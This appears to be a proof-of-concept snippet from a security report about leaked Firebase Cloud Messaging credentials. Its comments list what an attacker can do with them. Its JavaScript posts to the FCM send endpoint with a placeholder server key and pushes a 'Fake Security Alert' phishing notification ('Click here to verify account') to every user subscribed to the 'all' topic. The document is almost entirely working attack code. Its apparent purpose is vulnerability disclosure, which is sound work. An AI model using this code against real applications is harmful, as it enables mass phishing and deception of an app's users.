// Using exposed VAPID key + messagingSenderId
// Attacker can:
// 1. Send fake notifications to ALL users
// 2. Phishing via push notifications
// 3. Fake "Payment successful" notifications
// 4. Fake password reset notifications

fetch('https://fcm.googleapis.com/fcm/send', {
    method: 'POST',
    headers: {
        'Authorization': 'key=<server_key>',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        to: '/topics/all',
        notification: {
            title: 'Fake Security Alert',
            body: 'Click here to verify account'
        }
    })
}).then(response => response.json())
    .then(data => console.log('Notification sent:', data))
    .catch(error => console.error('Error sending notification:', error));   
